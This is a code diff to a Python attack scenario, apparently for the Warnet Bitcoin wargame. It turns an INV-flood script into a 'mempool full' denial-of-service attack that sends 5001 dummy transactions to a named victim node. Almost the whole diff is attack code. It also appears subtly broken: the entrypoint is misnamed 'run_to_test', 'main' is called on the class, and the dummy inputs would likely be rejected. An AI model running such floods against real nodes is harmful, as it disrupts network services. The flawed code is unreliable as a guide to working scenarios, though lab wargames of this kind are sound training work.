@@ -5,7 +5,15 @@ import socket
 from commander import Commander
 
 # The entire Bitcoin Core test_framework directory is available as a library
-from test_framework.messages import MSG_TX, CInv, hash256, msg_inv
+from test_framework.messages import (
+    CTransaction,
+    CTxIn,
+    CTxOut,
+    COutPoint,
+    msg_tx,
+    COIN,
+    hash256,
+)
 from test_framework.p2p import MAGIC_BYTES, P2PInterface
 
 
@@ -18,25 +26,46 @@ def get_signet_network_magic_from_node(node):
     return digest[0:4]
 
 
-# The actual scenario is a class like a Bitcoin Core functional test.
-# Commander is a subclass of BitcoinTestFramework instide Warnet
-# that allows to operate on containerized nodes instead of local nodes.
-class Inv5K(Commander):
+class MempoolFull(Commander):
     def set_test_params(self):
         # This setting is ignored but still required as
         # a sub-class of BitcoinTestFramework
         self.num_nodes = 1
 
     def add_options(self, parser):
-        parser.description = "Demonstrate INV attack using a scenario and P2PInterface"
-        parser.usage = "warnet run /path/to/my_first_attack_5kinv.py"
+        parser.description = (
+            "Demonstrate Mempool Full DoS attack using a scenario and P2PInterface"
+        )
+        parser.usage = "warnet run /path/to/mempool_full_attack.py"
 
-    # Scenario entrypoint
-    def run_test(self):
-        # We pick a node on the network to attack
-        # We know this one is vulnderable to 5k inv messages based on it's subver
-        # Change this to your teams colour if running in the battleground
-        victim = "TARGET_TANK_NAME.default.svc"
+    def create_dummy_transaction(self):
+        # Create a dummy transaction
+        tx = CTransaction()
+
+        # Add an input
+        # Using a dummy previous transaction hash (all zeros)
+        prevout = COutPoint(hash=0, n=0xFFFFFFFF)
+        tx_in = CTxIn(prevout=prevout, scriptSig=b"", nSequence=0xFFFFFFFF)
+        tx.vin = [tx_in]
+
+        # Add an output
+        # Send 1 BTC to a dummy script pubkey
+        script_pubkey = bytes.fromhex(
+            "76a914000000000000000000000000000000000000000088ac"
+        )  # OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
+        tx_out = CTxOut(nValue=1 * COIN, scriptPubKey=script_pubkey)
+        tx.vout = [tx_out]
+
+        # Calculate transaction hash
+        tx.rehash()
+
+        return tx
+
+    # Scenario Entrypoint
+    def run_to_test(self):
+        # picking one node from the network to attack
+        # we know this node is vulnerable to mempool_full DoS
+        victim = "tank-0000-red"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -53,20 +82,30 @@ class Inv5K(Commander):
         # Now we will use a python-based Bitcoin p2p node to send very specific,
         # unusual or non-standard messages to a "victim" node.
         self.log.info(f"Attacking {victim}")
+
         attacker = P2PInterface()
+
         attacker.peer_connect(
             dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
         )()
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
-        msg = msg_inv([CInv(MSG_TX, 0x12345)])
+        tx = self.create_dummy_transaction()
+        msg = msg_tx(tx)
+
+        # Send multiple transactions
         for i in range(5001):
+            # Modify the transaction slightly for each iteration to create unique txids
+            tx.vin[0].prevout.n = i
+            tx.rehash()
+            msg.tx = tx
+
             attacker.send_and_ping(msg)
-            self.log.info(f"Sent inv message {i}")
+            self.log.info(f"Sent transaction message {i}")
 
 
 def main():
-    Inv5K().main()
+    MempoolFull.main()
 
 
 if __name__ == "__main__":
